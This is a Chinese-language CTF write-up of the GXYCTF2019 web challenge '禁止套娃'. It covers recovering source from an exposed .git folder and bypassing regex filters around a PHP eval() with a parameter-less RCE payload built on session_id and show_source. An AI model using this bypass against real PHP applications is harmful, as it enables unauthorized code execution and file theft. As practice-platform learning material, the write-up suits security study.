---
title: GXYCTF2019-web
date: 2020-04-26 15:52:11
updated: 2020-04-26 15:52:11
tags:
 - ctf
 - web
 - 刷题
 - gxyctf2019
categories:
 - 刷题记录
---

# web

## 禁止套娃

扫描目录发现git泄露

```
---- Scanning URL: http://3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn/ ----
==> DIRECTORY: http://3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn/.git/
+ http://3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn/flag.php (CODE:200|SIZE:0)
+ http://3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn/.git/index (CODE:200|SIZE:137)
+ http://3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn/.git/config (CODE:200|SIZE:92)
+ http://3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn/.git/ (CODE:403|SIZE:571)
```

使用githack复原代码得到

 ```php
//index.php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
 ```

第二个正则不大能看懂，于是百度一下得到考点：**无参数rec**  skysec师傅的[文章](https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/)介绍得很详细

>能执行a(b()),a()之类的函数，a("1"),这样就不行。

看完skysec师傅的文章后知道了第二个正则匹配的的意思

 第一个正则的意思payload是不能使用包含下列字符串的伪协议

```
data://,php://,phar://,filter://
```

第三个也是payload不能包含下列字符串 

```
et|na|info|dec|bin|hex|oct|pi|log
```

使用session_id进行无参数rce，

过滤了et，不能使用file_get_contents,之类的函数，但是可以使用highlight_file、show_source

payload

```
exp=show_source(session_id(session_start()));
```

修改cookie中PHPSESSID=flag.php

访问即可拿到flag

